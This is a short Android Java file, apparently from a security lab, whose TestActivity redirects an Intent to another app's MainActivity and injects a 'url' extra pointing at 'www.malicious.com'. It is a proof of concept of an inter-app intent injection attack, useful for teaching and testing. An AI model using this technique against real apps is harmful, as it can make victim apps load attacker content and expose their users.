package com.example.lab1;

import androidx.appcompat.app.AppCompatActivity;

import android.content.ComponentName;
import android.os.Bundle;
import android.content.Intent;

public class TestActivity extends AppCompatActivity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Intent i = getIntent();
        i.setComponent(new ComponentName(
                "com.example.myapplcation",
                "com.example.myapplcation.MainActivity"
        ));
        i.putExtra("url", "www.malicious.com");
        startActivity(i);
    }
}

